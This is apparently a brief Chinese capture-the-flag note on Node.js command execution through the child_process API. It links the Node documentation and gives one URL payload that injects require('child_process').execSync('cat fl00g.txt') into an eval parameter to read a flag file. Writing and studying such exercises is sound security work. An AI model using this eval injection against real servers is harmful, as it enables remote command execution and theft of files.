# 知识点
可以通过child_process这个API来进行命令执行<br />[Child process | Node.js v17.9.1 Documentation](https://nodejs.org/docs/latest-v17.x/api/child_process.html#child_processexecsynccommand-options)
# 思路
```php
?eval=require(%22child_process%22).execSync(%27cat fl00g.txt%27)
```
